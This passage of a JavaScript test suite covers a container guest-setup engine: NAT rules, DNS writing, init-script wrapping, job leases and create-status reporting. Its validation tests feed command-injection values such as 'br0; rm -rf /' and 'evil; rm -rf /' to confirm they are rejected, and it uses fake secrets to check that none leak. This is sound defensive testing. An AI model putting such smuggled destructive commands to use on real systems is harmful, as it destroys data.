// A-17.7: the post-launch and post-start guest setup (NAT, the address wait,
// DNS, the init script, the routes) as a durable `guest_setup` runner job
// queued by the create / start / restart job, with the routes as the
// backend-executed `configure_routes` step. What is proved here, and how:
//   * the pure layer (setup-logic): the kind registries agree, strict
//     parameter validation (a script REFERENCE, never its text; ordered
//     phases; validated services), the fixed NAT argv, the host-reachable
//     address pick, the guest scripts' markers, the phase table, and the
//     dashboard's create-status derived from records alone;
//   * the guest scripts under a REAL `sh` (a temp resolv.conf, a temp log
//     dir): the DNS write, the init wrapper recording the exit code and the
//     tail in the guest, the read-back a resumed job does, the kill after a
//     timeout;
//   * the input store: 0600 files next to the database, read by reference,
//     consumed once, swept when nobody consumed them;
//   * the callers' behaviour through the real store and executor
//     (node:sqlite, a scripted host + guest): the dashboard's create carrying
//     the plan → the setup follow-up bound to the launched guest → the routes
//     step (lib/guest-routes over a real schema and a fake render) → the
//     create-status answer at every stage; MCP's create waiting on the setup
//     record for the address; start / restart / reboot's fix-up follow-up;
//   * failure paths: no address, an init script that exits nonzero, one that
//     times out (killed, recorded), containment unavailable; the guest stays
//     Running and the record is partial and truthful;
//   * interruption: a dead owner before the script (resumed, run once),
//     after the script (resumed, the recorded exit READ, never re-run;
//     nothing recorded → init_uncertain with the lease released), the
//     backend's boot sweep;
//   * safe retries: a retried setup never repeats an issued or completed
//     init, and re-renders rather than duplicates routes;
//   * unavailable runners, unresolved holds, and contention on the shared
//     network and route leases (waited for, taken over when dead, requeued).
// The REST routes and the MCP tool import the native database module; their
// caller-side wiring is ratcheted in immediate-repairs.test.js.

import test from 'node:test';
import assert from 'node:assert/strict';
import { DatabaseSync } from 'node:sqlite';
import { spawn, spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, existsSync, statSync, writeFileSync, symlinkSync, utimesSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  SETUP_JOB_KINDS, BACKEND_STEP_KINDS, SETUP_PHASES, FIXUP_PHASES, HOST_NETWORK_LOCK, HOST_ROUTES_LOCK, validateSetupParams, validateRoutesParams, normalizeServices,
  ipForwardArgv, networkListArgv, bridgeNatArgv, dockerUserCheckArgv, dockerUserInsertArgv, masqueradeCheckArgv, masqueradeAppendArgv, managedBridges,
  hostReachableIpv4, dnsScript, parseDns, initScriptWrapper, initResultReadScript, initKillScript, parseInitResult, parseInitKill, phaseTable, setupOutcome, createStatusView, initWarning,
} from '../lib/setup-engine/setup-logic.js';
import { setupInputsDir, writeInitScriptInput, readInitScriptInput, consumeInitScriptInput, sweepSetupInputs, sha256Of } from '../lib/setup-engine/setup-inputs.js';
import { ownerIdentity, parseJson, validateRunnerJob, reconcileDecision, RUNNER_JOB_KINDS, MUTATING_JOB_KINDS, EXCLUSIVE_JOB_KINDS, BACKEND_JOB_KINDS, SETUP_JOB_KINDS as SETUP_KINDS_FROM_LOGIC } from '../lib/setup-engine/logic.js';
import { validateLifecycleParams, setupFollowUpFor } from '../lib/setup-engine/lifecycle-logic.js';
import { ensureSetupEngineSchema, getJob, listEvents, readLock, acquireLock, createJob, claimNextJob, checkpoint, runnerHeartbeat, listJobs, holdStaleLock, recordJobOutcome, releaseLock } from '../lib/setup-engine/store.js';
import { runOnce, reconcile } from '../lib/setup-engine/executor.js';
import { runBackendSteps } from '../lib/setup-engine/backend-steps.js';
import { submitRunnerJob } from '../lib/setup-engine/orchestrator.js';
import { sweepSetupEngineOnBoot } from '../lib/setup-engine/backend.js';
import { runGuestSetupOperation } from '../lib/setup-engine/setup-op.js';
import { configureGuestRoutes, findOrCreateLxcService, syncServiceUpstream } from '../lib/guest-routes.js';
import { configureContainerLockStore } from '../mock2/container-lock.js';
import { runLifecycle, runGuestSetup, createStatus, waitForSetup, drainBackendStepsNow, lifecycleHttpStatus, resolveSetupPlan } from '../mock2/ops.js';
import { unwrapContained } from './helpers/scripted-guest.js';

const T0 = Date.parse('2026-09-23T12:00:00.000Z');
const RUNNER = ownerIdentity({ kind: 'runner', host: 'pp', pid: 300, instance: 'rrrr' });
const BACKEND = ownerIdentity({ kind: 'backend', host: 'pp', pid: 100, instance: 'aaaa' });
const DEAD = ownerIdentity({ kind: 'runner', host: 'pp', pid: 999, instance: 'dead' });
const DEAD_BACKEND = ownerIdentity({ kind: 'backend', host: 'pp', pid: 998, instance: 'gone' });
const OTHER = ownerIdentity({ kind: 'runner', host: 'pp', pid: 301, instance: 'oooo' });
const UUID_A = '11111111-2222-3333-4444-555555555555';
const UUID_B = '99999999-8888-7777-6666-555555555555';
const SHA = 'a'.repeat(64);
const SCRIPT = '#!/bin/sh\napt-get install -y nginx\nexport API_TOKEN=tok-9f8e7d6c5b4a-secret\necho done\n';
const SERVICES = [{ domain: 'app.example.test', port: 3000, obtainCert: true }, { domain: 'api.example.test', port: 8080, obtainCert: false, healthPath: '/healthz' }];

function db() { const d = new DatabaseSync(':memory:'); ensureSetupEngineSchema(d); return d; }
function tmp() { return mkdtempSync(join(tmpdir(), 'pp-setup-')); }
const net = (ip, extra = {}) => ({ eth0: { addresses: [{ family: 'inet', address: ip, scope: 'global', netmask: '24' }, { family: 'inet6', address: 'fe80::1', scope: 'link' }] }, lo: { addresses: [{ family: 'inet', address: '127.0.0.1', scope: 'local' }] }, ...extra });
const inst = (over = {}) => ({ name: 'pp-x', status: 'Running', created_at: '2026-09-01T10:00:00Z', config: { 'volatile.uuid': UUID_A }, snapshots: [], expanded_devices: { root: { type: 'disk', path: '/', pool: 'default' }, eth0: { type: 'nic', network: 'incusbr0' } }, state: { network: net('10.10.10.5') }, ...over });

// The scripted host: incus / sysctl / iptables as argv arrays over a state.
//   state.instances      the guests; a guest gains its address when
//                        state.lists >= (state.addressAfter ?? 0)
//   state.bridges        what `incus network list` reports
//   state.rules          the iptables rules present ('DOCKER-USER -i incusbr0', 'MASQ')
//   state.dockerChain    false → iptables DOCKER-USER commands fail (no Docker)
//   state.launchFails    the launch fails
function scriptedHost(state) {
  const calls = [];
  state.rules = state.rules || new Set();
  state.lists = 0;
  const byName = (n) => state.instances.find((i) => i.name === n) || null;
  const withAddress = (i) => (state.lists >= (state.addressAfter ?? 0) && !state.noAddress ? i : { ...i, state: { network: { lo: i.state?.network?.lo || { addresses: [] }, ...(state.dockerOnly ? { docker0: { addresses: [{ family: 'inet', address: '172.17.0.1', scope: 'global' }] } } : {}) } } });
  return {
    calls,
    host: async (argv) => {
      calls.push(argv);
      assert.ok(Array.isArray(argv) && argv.every((a) => typeof a === 'string'), 'argv arrays only');
      const [bin, ...a] = argv;
      if (bin === 'sysctl') { state.ipForward = a.includes('net.ipv4.ip_forward=1'); return state.sysctlFails ? { code: 255, stdout: '', stderr: 'sysctl: permission denied' } : { code: 0, stdout: 'net.ipv4.ip_forward = 1\n', stderr: '' }; }
      if (bin === 'iptables') {
        const t = a.join(' ');
        if (/DOCKER-USER/.test(t) && state.dockerChain === false) return { code: 2, stdout: '', stderr: "iptables: No chain/target/match by that name." };
        const key = /-t nat/.test(t) ? 'MASQ' : t.replace(/^-[CI] DOCKER-USER /, 'DOCKER-USER ').replace(/ -j ACCEPT$/, '');
        if (a[0] === '-C' || a[2] === '-C') return state.rules.has(key) ? { code: 0, stdout: '', stderr: '' } : { code: 1, stdout: '', stderr: 'iptables: Bad rule (does a matching rule exist in that chain?).' };
        state.rules.add(key); return { code: 0, stdout: '', stderr: '' };
      }
      if (bin !== 'incus') return { code: 127, stdout: '', stderr: `not found: ${bin}` };
      if (a[0] === 'network' && a[1] === 'list') return { code: 0, stdout: JSON.stringify(state.bridges ?? [{ name: 'incusbr0', type: 'bridge', managed: true }, { name: 'eth0', type: 'physical', managed: false }]), stderr: '' };
      if (a[0] === 'network' && a[1] === 'set') { state.natSet = [...(state.natSet || []), a[2]]; return state.natFails ? { code: 1, stdout: '', stderr: 'Error: Network not found' } : { code: 0, stdout: '', stderr: '' }; }
      if (a[0] === 'list') { state.lists += 1; const i = byName(a[1]); return { code: 0, stdout: JSON.stringify(i ? [withAddress(i)] : []), stderr: '' }; }
      if (a[0] === 'start') { const i = byName(a[1]); if (!i) return { code: 1, stdout: '', stderr: 'Error: Instance not found' }; i.status = 'Running'; return { code: 0, stdout: '', stderr: '' }; }
      if (a[0] === 'restart') { const i = byName(a[1]); if (!i) return { code: 1, stdout: '', stderr: 'Error: Instance not found' }; i.status = 'Running'; state.restarts = (state.restarts || 0) + 1; return { code: 0, stdout: '', stderr: '' }; }
      if (a[0] === 'stop') { const i = byName(a[1]); if (i) i.status = 'Stopped'; return { code: 0, stdout: '', stderr: '' }; }
      if (a[0] === 'delete') { state.instances = state.instances.filter((x) => x.name !== a[1]); state.deletes = (state.deletes || 0) + 1; return { code: 0, stdout: '', stderr: '' }; }
      if (a[0] === 'launch') {
        const name = a[2];
        if (byName(name)) return { code: 1, stdout: '', stderr: `Error: Instance "${name}" already exists` };
        if (state.launchFails) return { code: 1, stdout: '', stderr: 'Error: Failed instance creation: image not found' };
        state.launches = (state.launches || 0) + 1;
        state.instances.push(inst({ name, created_at: '2026-09-23T12:00:05Z', config: { 'volatile.uuid': UUID_B }, state: { network: net('10.10.10.7') } }));
        return { code: 0, stdout: '', stderr: '' };
      }
      if (a[0] === 'config') return { code: 0, stdout: '', stderr: '' };
      return { code: 1, stdout: '', stderr: `unexpected ${argv.join(' ')}` };
    },
  };
}

// The scripted guest: the DNS script, the init wrapper, the read-back and the
// kill, answered from state. Records every init script body it was handed.
//   state.initRc          the exit code the wrapper reports (default 0)
//   state.initTimesOut    the wrapper "hangs": the executor's timeout (124)
//   state.guestRc         what a RESUMED read finds in the .rc file (null → none)
//   state.guestRunning    a pid the read reports as still running
//   state.containment     'none' → every contained script refuses (97)
//   state.dnsFails        the resolv.conf write fails
function scriptedGuest(state) {
  const calls = [];
  state.initScripts = [];
  return {
    calls,
    guest: async (container, raw) => {
      const s = unwrapContained(raw);
      const rec = (phase) => calls.push({ container, phase, script: s, raw });
      if (state.containment === 'none' && /CONTAINMENT:none/.test(raw)) { rec('refused'); return { code: 97, stdout: '', stderr: 'CONTAINMENT:none\n' }; }
      if (/PP_DNS:/.test(s)) { rec('dns'); if (state.dnsFails) return { code: 1, stdout: 'PP_DNS:failed\n', stderr: '' }; state.dnsWrites = (state.dnsWrites || 0) + 1; return { code: 0, stdout: state.dnsPresent ? 'PP_DNS:unchanged\n' : 'PP_DNS:written\n', stderr: '' }; }
      if (/PP_INIT_KILL/.test(s)) { rec('init_kill'); state.killed = (state.killed || 0) + 1; return { code: 0, stdout: 'PP_INIT_KILL:gone\n', stderr: '' }; }
      if (/PP_INIT_RC:none/.test(s)) { rec('init_read'); return { code: 0, stdout: state.guestRc == null ? `PP_INIT_RC:none\n${state.guestRunning ? `PP_INIT_RUNNING:${state.guestRunning}\n` : ''}partial output\n` : `PP_INIT_RC:${state.guestRc}\nrecorded output\n`, stderr: '' }; }
      if (/PP_INIT_RC:\$rc/.test(s)) {
        rec('init');
        const m = s.match(/printf '%s' '([A-Za-z0-9+/=]+)' \| base64 -d > "\$S"/);
        state.initScripts.push(m ? Buffer.from(m[1], 'base64').toString('utf8') : null);
        if (state.initTimesOut) return { code: 124, stdout: 'still going\n', stderr: '\n[timeout after 305000ms]' };
        const rc = state.initRc ?? 0;
        return { code: 0, stdout: `PP_INIT_RC:${rc}\nReading package lists...\n${rc ? 'E: Unable to locate package nginx\n' : 'done\n'}`, stderr: '' };
      }
      rec('other'); return { code: 1, stdout: '', stderr: `unexpected: ${s.slice(0, 60)}` };
    },
  };
}

const exec = (h, g) => ({ guest: g.guest, host: h.host });
function clock(start = T0) { const c = { t: start }; c.nowMs = () => c.t; c.sleep = async (ms) => { c.t += ms; }; c.tick = (ms) => { c.t += ms; }; return c; }
const runAll = (d, ex, c, opts = {}) => runOnce({ db: d, owner: RUNNER, exec: ex, reviewLogin: async () => null, nowMs: c.nowMs, sleep: c.sleep, inputsDir: opts.inputsDir || null, log: () => {} }, { reconcileFirst: false, ...opts });
const mutations = (h) => h.calls.filter((a) => !(a[0] === 'incus' && (a[1] === 'list' || (a[1] === 'network' && a[2] === 'list'))));
const phasesOf = (d, id) => (parseJson(getJob(d, id).progress_json) || {}).phases || {};
const setupOf = (d, createId) => { const p = parseJson(getJob(d, createId).progress_json) || {}; return p.setup_job_id ? getJob(d, p.setup_job_id) : null; };
const noScriptIn = (d, ids) => { for (const id of ids) { const dump = JSON.stringify(getJob(d, id)) + JSON.stringify(listEvents(d, id)); assert.equal(dump.includes('tok-9f8e7d6c5b4a'), false, `the init script's token leaked into job ${id}`); assert.equal(dump.includes('apt-get install'), false, `the init script's text leaked into job ${id}`); } };

// A store for the ops layer over a scripted host + guest, an input dir and a
// route configurator that records what it was asked for.
function opsStore(d, h, g, { policy = 'backend-allowed', inputsDir = null, routes = null } = {}) {
  const asked = [];
  configureContainerLockStore({
    getDb: () => d, owner: BACKEND, env: { SETUP_EXECUTOR_POLICY: policy }, guestExec: exec(h, g), hostExec: h.host, reviewLogin: async () => null, inputsDir,
    configureRoutes: routes || (async (args) => { asked.push(args); return { created: args.services.map((s) => s.domain), existing: [], conflicts: [], rendered: args.services.map((s) => s.domain), renderWarning: null, upstreamWarning: null }; }),
  });
  return { asked };
}

// The dashboard's create: the launch plan with the whole setup, submitted
// detached and kicked (what POST /containers does); returns the create row.
async function dashboardCreate(d, h, g, { inputsDir, script = SCRIPT, services = SERVICES, name = 'pp-new' } = {}) {
  const setup = { phases: ['network_nat', 'await_address', 'dns'], addressTimeoutMs: 30_000 };
  if (script) { setup.initScript = writeInitScriptInput(inputsDir, script); setup.phases.push('init_script'); }
  if (services) { setup.phases.push('routes'); setup.services = services; setup.serviceName = name.replace(/^pp-/, ''); }
  const out = await runLifecycle({ kind: 'instance_create', containerName: name, image: 'images:debian/12', profile: 'default', config: { 'limits.cpu': '2' }, setup, via: 'ui', requestedBy: 'thomas', detach: true, awaitKick: true });
  return { out, setup };
}

// ── 1. the pure layer ─────────────────────────────────────────────────────

test('registry: guest_setup is a runner, mutating and exclusive kind (the two modules agree); configure_routes is the backend\'s; the phases are fixed and ordered', () => {
  assert.deepEqual([...SETUP_JOB_KINDS], ['guest_setup']); assert.deepEqual([...SETUP_KINDS_FROM_LOGIC], [...SETUP_JOB_KINDS], 'logic.js spells the list out (import cycle); it must match');
  assert.ok(RUNNER_JOB_KINDS.includes('guest_setup')); assert.ok(MUTATING_JOB_KINDS.includes('guest_setup')); assert.ok(EXCLUSIVE_JOB_KINDS.includes('guest_setup'));
  assert.deepEqual([...BACKEND_STEP_KINDS], ['configure_routes']); assert.ok(BACKEND_JOB_KINDS.includes('configure_routes')); assert.ok(!RUNNER_JOB_KINDS.includes('configure_routes'), 'the runner never claims a backend step');
  assert.ok(MUTATING_JOB_KINDS.includes('configure_routes'), 'a lifecycle verb is refused while the routes are being configured');
  assert.deepEqual([...SETUP_PHASES], ['network_nat', 'await_address', 'dns', 'init_script', 'routes']); assert.deepEqual([...FIXUP_PHASES], ['network_nat', 'dns']);
  assert.equal(HOST_NETWORK_LOCK, '@host/network'); assert.equal(HOST_ROUTES_LOCK, '@host/routes');
  assert.ok(!/^[a-zA-Z0-9]/.test(HOST_NETWORK_LOCK), 'a host lease name can never be a guest name');
});

test('validation is strict: a script REFERENCE (ref, sha256, bytes) and never its text; phases in order; services validated; nothing that looks like a command or a secret', () => {
  const ok = (p) => assert.deepEqual(validateSetupParams(p), { ok: true }, JSON.stringify(p));
  const bad = (p, re) => assert.match(validateSetupParams(p).reason, re, JSON.stringify(p));
  ok({ container: 'pp-x', phases: ['network_nat', 'dns'] });
  ok({ container: 'pp-x', phases: ['network_nat', 'await_address', 'dns', 'init_script', 'routes'], expect: { uuid: UUID_A, created_at: '2026-09-01T10:00:00Z' }, initScript: { ref: 'r-1', sha256: SHA, bytes: 42 }, services: SERVICES, serviceName: 'x', addressTimeoutMs: 15000, initTimeoutMs: 60000, resolvers: ['9.9.9.9'], origin: { jobId: 'j-1', kind: 'instance_create' } });
  bad({ container: 'pp-x', phases: ['dns', 'network_nat'] }, /fixed order/);
  bad({ container: 'pp-x', phases: ['reboot'] }, /not a setup phase/);
  bad({ container: 'pp-x', phases: [] }, /at least one/);
  bad({ container: 'pp-x', phases: ['init_script'] }, /needs initScript/);
  bad({ container: 'pp-x', phases: ['init_script'], initScript: { ref: 'r', sha256: 'abc', bytes: 1 } }, /hex digest/);
  bad({ container: 'pp-x', phases: ['init_script'], initScript: { ref: 'r', sha256: SHA, bytes: 1, text: '#!/bin/sh' } }, /not a script reference field/);
  bad({ container: 'pp-x', phases: ['dns'], initScriptText: '#!/bin/sh' }, /never carries a command/);
  bad({ container: 'pp-x', phases: ['dns'], command: 'sh /tmp/x' }, /never carries a command/);
  bad({ container: 'pp-x', phases: ['dns'], initScript: { ref: 'r', sha256: SHA, bytes: 1 } }, /init_script phase only/);
  bad({ container: 'pp-x', phases: ['routes'], services: [{ domain: 'not a domain', port: 80 }], serviceName: 'x' }, /not a domain name/);
  bad({ container: 'pp-x', phases: ['routes'], services: [{ domain: 'a.example.test', port: 70000 }], serviceName: 'x' }, /port must be/);
  bad({ container: 'pp-x', phases: ['routes'], services: [{ domain: 'a.example.test', port: 80, healthPath: 'health' }], serviceName: 'x' }, /healthPath must start with/);
  bad({ container: 'pp-x', phases: ['routes'], services: [{ domain: 'a.example.test', port: 80 }, { domain: 'A.example.test', port: 81 }], serviceName: 'x' }, /listed twice/);
  bad({ container: 'pp-x', phases: ['routes'], services: SERVICES }, /serviceName/);
  bad({ container: 'pp-x', phases: ['dns'], addressTimeoutMs: 10 }, /addressTimeoutMs/);
  bad({ container: 'pp-x', phases: ['dns'], resolvers: ['dns.example'] }, /IPv4/);
  bad({ container: 'pp-x', phases: ['dns'], expect: { name: 'pp-x' } }, /not an identity field/);
  bad({ container: 'pp-x', phases: ['dns'], password: 'hunter2' }, /looks like a secret/);
  assert.match(validateRoutesParams({ container: 'pp-x', serviceName: 'x', ip: '10.0.0.300', services: SERVICES }).reason, /IPv4/);
  assert.deepEqual(validateRoutesParams({ container: 'pp-x', serviceName: 'x', ip: '10.10.10.5', services: SERVICES }), { ok: true });
  assert.deepEqual(normalizeServices([{ domain: ' App.Example.Test ', port: '3000' }, { domain: '', port: 1 }]), { services: [{ domain: 'app.example.test', port: 3000, obtainCert: true }] });
  assert.match(normalizeServices([{ domain: 'x', port: 1 }]).error, /not a domain name/);
  // Through validateRunnerJob, as the runner validates a claimed row.
  assert.deepEqual(validateRunnerJob({ kind: 'guest_setup', app: 'pp-x', plan: { steps: [], params: { container: 'pp-x', phases: ['dns'] } } }), { ok: true });
  assert.match(validateRunnerJob({ kind: 'guest_setup', app: 'pp-x', plan: { steps: [], params: { container: 'pp-x', phases: ['dns'], argv: ['sh'] } } }).reason, /never carries a command/);
  // A create carries the plan without an identity; a start carries the fix-up flag; nothing else does.
  assert.deepEqual(validateLifecycleParams('instance_create', { container: 'pp-n', image: 'images:debian/12', setup: { phases: ['network_nat', 'dns'] } }), { ok: true });
  assert.match(validateLifecycleParams('instance_create', { container: 'pp-n', image: 'images:debian/12', setup: { phases: ['dns'], expect: { uuid: UUID_A } } }).reason, /binds its identity from the launched guest/);
  assert.match(validateLifecycleParams('instance_start', { container: 'pp-x', setup: { phases: ['dns'] } }).reason, /carries no setup plan/);
  assert.deepEqual(validateLifecycleParams('instance_start', { container: 'pp-x', fixup: true }), { ok: true });
  assert.match(validateLifecycleParams('instance_stop', { container: 'pp-x', fixup: true }).reason, /fixup applies to start and restart/);
  assert.deepEqual(setupFollowUpFor('instance_create', { container: 'pp-n', setup: { phases: ['dns', 'network_nat'], addressTimeoutMs: 5000 } }, { uuid: UUID_B, created_at: '2026-09-23T12:00:05Z', status: 'Running' }), { kind: 'guest_setup', params: { phases: ['network_nat', 'dns'], addressTimeoutMs: 5000, container: 'pp-n', expect: { uuid: UUID_B, created_at: '2026-09-23T12:00:05Z' } } });
  assert.equal(setupFollowUpFor('instance_start', { container: 'pp-x' }, null), null);
});

test('the NAT phase renders fixed argv; a bridge name the host reports is validated before it becomes an argument; the address pick is host-reachable only', () => {
  assert.deepEqual(ipForwardArgv(), ['sysctl', '-w', 'net.ipv4.ip_forward=1']);
  assert.deepEqual(networkListArgv(), ['incus', 'network', 'list', '--format', 'json']);
  assert.deepEqual(bridgeNatArgv('incusbr0'), ['incus', 'network', 'set', 'incusbr0', 'ipv4.nat', 'true']);
  assert.deepEqual(dockerUserCheckArgv('m2br7', 'in'), ['iptables', '-C', 'DOCKER-USER', '-i', 'm2br7', '-j', 'ACCEPT']);
  assert.deepEqual(dockerUserInsertArgv('m2br7', 'out'), ['iptables', '-I', 'DOCKER-USER', '-o', 'm2br7', '-j', 'ACCEPT']);
  assert.deepEqual(masqueradeCheckArgv(), ['iptables', '-t', 'nat', '-C', 'POSTROUTING', '-s', '10.0.0.0/8', '!', '-d', '10.0.0.0/8', '-j', 'MASQUERADE']);
  assert.deepEqual(masqueradeAppendArgv().slice(0, 5), ['iptables', '-t', 'nat', '-A', 'POSTROUTING']);
  assert.throws(() => bridgeNatArgv('br0; rm -rf /'), /not a bridge name/);
  assert.deepEqual(managedBridges(JSON.stringify([{ name: 'incusbr0', type: 'bridge', managed: true }, { name: 'ext', type: 'bridge', managed: false }, { name: 'bad name', type: 'bridge', managed: true }, { name: 'eth0', type: 'physical', managed: false }])), { bridges: ['incusbr0'], rejected: ['bad name'] });
  assert.match(managedBridges('nope').error, /not JSON/);
  assert.deepEqual(hostReachableIpv4(inst()), { address: '10.10.10.5', interface: 'eth0' });
  assert.deepEqual(hostReachableIpv4(inst({ state: { network: { docker0: { addresses: [{ family: 'inet', address: '172.17.0.1', scope: 'global' }] }, eth0: { addresses: [{ family: 'inet', address: '10.10.10.9', scope: 'global' }] } } } })), { address: '10.10.10.9', interface: 'eth0' }, 'eth0 first');
  assert.equal(hostReachableIpv4(inst({ state: { network: { docker0: { addresses: [{ family: 'inet', address: '172.17.0.1', scope: 'global' }] }, 'br-abc123': { addresses: [{ family: 'inet', address: '172.18.0.1', scope: 'global' }] } } } })), null, 'a runtime\'s own bridge inside the guest is never the address');
  assert.deepEqual(hostReachableIpv4(inst({ state: { network: { enp5s0: { addresses: [{ family: 'inet', address: '10.20.0.4', scope: 'global' }] } } }, expanded_devices: { eth0: { type: 'nic', name: 'enp5s0', network: 'incusbr0' } } })), { address: '10.20.0.4', interface: 'enp5s0' }, 'the NIC device by its in-guest name');
  assert.equal(hostReachableIpv4(inst({ state: { network: { eth0: { addresses: [{ family: 'inet', address: '169.254.1.1', scope: 'link' }] } } } })), null);
  assert.equal(hostReachableIpv4({}), null);
});

test('scripts, markers and the record\'s reading: parseDns, parseInitResult, the phase table, the outcome and the create-status view', () => {
  assert.equal(parseDns('PP_DNS:written\n'), 'written'); assert.equal(parseDns('nothing'), null);
  assert.deepEqual(parseInitResult('PP_INIT_RC:3\nsome output\n'), { rc: 3, running: null, tail: 'some output', writeFailed: false, recorded: true });
  assert.deepEqual(parseInitResult('PP_INIT_RC:none\nPP_INIT_RUNNING:4242\nhalf\n').running, 4242);
  assert.equal(parseInitResult('PP_INIT_WRITE_FAILED\n').writeFailed, true);
  assert.equal(parseInitKill('PP_INIT_KILL:gone'), 'gone');
  assert.deepEqual(phaseTable(['network_nat', 'dns'], { network_nat: { state: 'done' } }), { network_nat: { state: 'done' }, dns: { state: 'not_run' } });
  assert.deepEqual(setupOutcome({ network_nat: { state: 'done' }, routes: { state: 'pending' } }), { status: 'succeeded', outcome: 'setup_complete', failed: [] });
  assert.deepEqual(setupOutcome({ network_nat: { state: 'done' }, init_script: { state: 'failed', rc: 2 }, routes: { state: 'not_run' } }), { status: 'failed', outcome: 'setup_partial', failed: ['init_script', 'routes'] });
  assert.equal(setupOutcome({ init_script: { state: 'uncertain' } }).outcome, 'init_uncertain');
  assert.equal(setupOutcome({ network_nat: { state: 'skipped', contended: true } }).outcome, 'setup_partial', 'a contended NAT is not a completed setup');
  assert.equal(setupOutcome({ init_script: { state: 'skipped', notRepeated: true } }).outcome, 'setup_complete', 'an init a retry deliberately did not repeat is not a failure of the retry');
  assert.match(initWarning({ state: 'failed', rc: 100, tail: 'E: boom' }), /exited with code 100[\s\S]*E: boom/);
  assert.match(initWarning({ state: 'timed_out', timeoutMs: 300000 }), /timed out after 5 minutes/);
  assert.equal(initWarning({ state: 'done' }), null);
  // The create-status view from records alone.
  const create = (over = {}) => ({ id: 'c1', status: 'succeeded', created_at: new Date(T0 - 40_000).toISOString(), progress: { setup_job_id: 's1' }, ...over });
  const setup = (over = {}) => ({ id: 's1', status: 'running', phase: 'dns', progress: { phases: { network_nat: { state: 'done' } }, address: { ip: '10.10.10.7' } }, ...over });
  assert.equal(createStatusView({ create: null }), null);
  assert.deepEqual(createStatusView({ create: create({ status: 'queued', progress: {} }), nowMs: T0 }).phase, 'downloading');
  assert.equal(createStatusView({ create: create({ status: 'running', phase: 'issuing', progress: {} }), nowMs: T0 }).message, 'Downloading the image and launching…');
  const failed = createStatusView({ create: create({ status: 'failed', reason: 'incus launch exited 1: image not found', progress: {} }), nowMs: T0 });
  assert.equal(failed.phase, 'failed'); assert.match(failed.error, /image not found/); assert.equal(failed.elapsed, 40);
  assert.equal(createStatusView({ create: create({ progress: {} }), nowMs: T0 }).phase, 'ready', 'a create without a setup is ready when it succeeded');
  assert.equal(createStatusView({ create: create(), setup: null, nowMs: T0 }).phase, 'configuring');
  assert.equal(createStatusView({ create: create(), setup: setup({ status: 'queued' }), nowMs: T0 }).phase, 'configuring');
  assert.equal(createStatusView({ create: create(), setup: setup({ phase: 'network_nat' }), nowMs: T0 }).phase, 'configuring');
  assert.equal(createStatusView({ create: create(), setup: setup({ phase: 'await_address' }), nowMs: T0 }).phase, 'network');
  assert.equal(createStatusView({ create: create(), setup: setup({ phase: 'dns' }), nowMs: T0 }).phase, 'network');
  assert.equal(createStatusView({ create: create(), setup: setup({ phase: 'init_script' }), nowMs: T0 }).phase, 'init-script');
  const pendingRoutes = setup({ status: 'succeeded', phase: 'finished', progress: { phases: { network_nat: { state: 'done' }, routes: { state: 'pending' } }, address: { ip: '10.10.10.7' }, routes_job_id: 'r1' } });
  assert.equal(createStatusView({ create: create(), setup: pendingRoutes, routes: { id: 'r1', status: 'queued' }, nowMs: T0 }).phase, 'caddy');
  const doneRoutes = setup({ status: 'succeeded', phase: 'finished', progress: { phases: { network_nat: { state: 'done' }, init_script: { state: 'failed', rc: 2, tail: 'E: nope' }, routes: { state: 'done', conflicts: [{ domain: 'api.example.test' }] } }, address: { ip: '10.10.10.7' } } });
  const ready = createStatusView({ create: create(), setup: doneRoutes, nowMs: T0 });
  assert.equal(ready.phase, 'ready'); assert.equal(ready.ip, '10.10.10.7'); assert.match(ready.initScriptWarning, /exited with code 2/); assert.match(ready.caddyWarning, /api.example.test already routed elsewhere/); assert.equal(ready.setupJobId, 's1');
  // A routes job that died without annotating: read from its own row.
  const orphan = createStatusView({ create: create(), setup: pendingRoutes, routes: { id: 'r1', status: 'failed', reason: 'interrupted' }, nowMs: T0 });
  assert.equal(orphan.phase, 'ready'); assert.match(orphan.caddyWarning, /Routes failed: interrupted/);
  const partial = createStatusView({ create: create(), setup: setup({ status: 'failed', reason: 'pp-n: await_address: failed (no address)', phase: 'finished', progress: { phases: { await_address: { state: 'failed', detail: 'no address' }, routes: { state: 'skipped', detail: 'no host-reachable address was found' } } } }), nowMs: T0 });
  assert.equal(partial.phase, 'ready', 'the guest is usable'); assert.match(partial.caddyWarning, /Routes not configured: no host-reachable address/);
});

// ── 2. the guest scripts under a real sh ──────────────────────────────────

const sh = (script, { timeoutMs = 10_000 } = {}) => spawnSync('sh', ['-s'], { input: script, encoding: 'utf8', timeout: timeoutMs });

test('dnsScript under sh: writes the resolvers when the marker is absent (replacing a symlink), leaves the file alone when present, reports a write failure', () => {
  const dir = tmp();
  const target = join(dir, 'resolv.conf');
  writeFileSync(join(dir, 'stub-resolv.conf'), 'nameserver 127.0.0.53\n');
  symlinkSync(join(dir, 'stub-resolv.conf'), target);
  let r = sh(dnsScript({ resolvPath: target }));
  assert.equal(r.status, 0, r.stderr); assert.equal(parseDns(r.stdout), 'written');
  assert.equal(readFileSync(target, 'utf8'), 'nameserver 9.9.9.9\nnameserver 1.1.1.1\n');
  assert.equal(statSync(target).isSymbolicLink?.() || false, false, 'the symlink was replaced by a file');
  assert.equal(readFileSync(join(dir, 'stub-resolv.conf'), 'utf8'), 'nameserver 127.0.0.53\n', 'the symlink target was not written through');
  r = sh(dnsScript({ resolvPath: target }));
  assert.equal(parseDns(r.stdout), 'unchanged');
  r = sh(dnsScript({ resolvers: ['1.0.0.1'], resolvPath: join(dir, 'no-such-dir', 'resolv.conf') }));
  assert.equal(r.status, 1); assert.equal(parseDns(r.stdout), 'failed');
  assert.throws(() => dnsScript({ resolvers: ['evil; rm -rf /'] }), /IPv4/);
  assert.throws(() => dnsScript({ resolvPath: 'relative' }), /absolute/);
  rmSync(dir, { recursive: true, force: true });
});

test('initScriptWrapper under sh: the script runs from base64, its exit code and output are recorded in the guest and reported; the read-back finds them; the temp script is gone', () => {
  const dir = tmp();
  const body = '#!/bin/sh\necho hello from init\necho to stderr >&2\nexit 3\n';
  const b64 = Buffer.from(body, 'utf8').toString('base64');
  const r = sh(initScriptWrapper({ jobId: 'job-1', b64, logDir: dir, tmpDir: dir }));
  assert.equal(r.status, 0, r.stderr);
  const res = parseInitResult(r.stdout);
  assert.equal(res.rc, 3); assert.equal(res.recorded, true); assert.match(res.tail, /hello from init/); assert.match(res.tail, /to stderr/);
  assert.equal(readFileSync(join(dir, 'pp-init-job-1.rc'), 'utf8').trim(), '3');
